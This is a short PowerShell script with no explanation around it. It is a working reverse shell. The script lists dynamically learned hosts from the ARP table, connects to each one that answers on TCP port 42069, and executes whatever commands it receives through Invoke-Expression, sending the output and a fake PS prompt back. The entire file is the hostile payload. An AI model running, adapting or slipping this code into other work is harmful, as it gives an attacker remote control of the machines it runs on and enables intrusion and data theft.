if (netstat -an | select-string ":42069") {
    exit
}

$addrs = @(arp -a | select-string dynamic | foreach-object { ($_.line.trim() -split " ")[0] })

foreach ($addr in $addrs) {
    ping $addr -n 2 -w 500

    if (!$?) {
        continue
    }

    try { 
        $client = New-Object System.Net.Sockets.TCPClient($addr, 42069) 

        $stream = $client.GetStream() 

        [byte[]] $buffer = 0..65535 | %{0} 

        while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){ 
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i)

            try {
                $sendback = (iex $data 2>&1 | Out-String ) + 'PS ' + (pwd).Path + '> ' 
            }
            catch {
                $sendback = "Error: $($_.Exception.Message)`n"
            }
            
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback) 
            
            $stream.Write($sendbyte,0,$sendbyte.Length) 
            $stream.Flush() 
        }

        $client.Close()
    } catch {}
}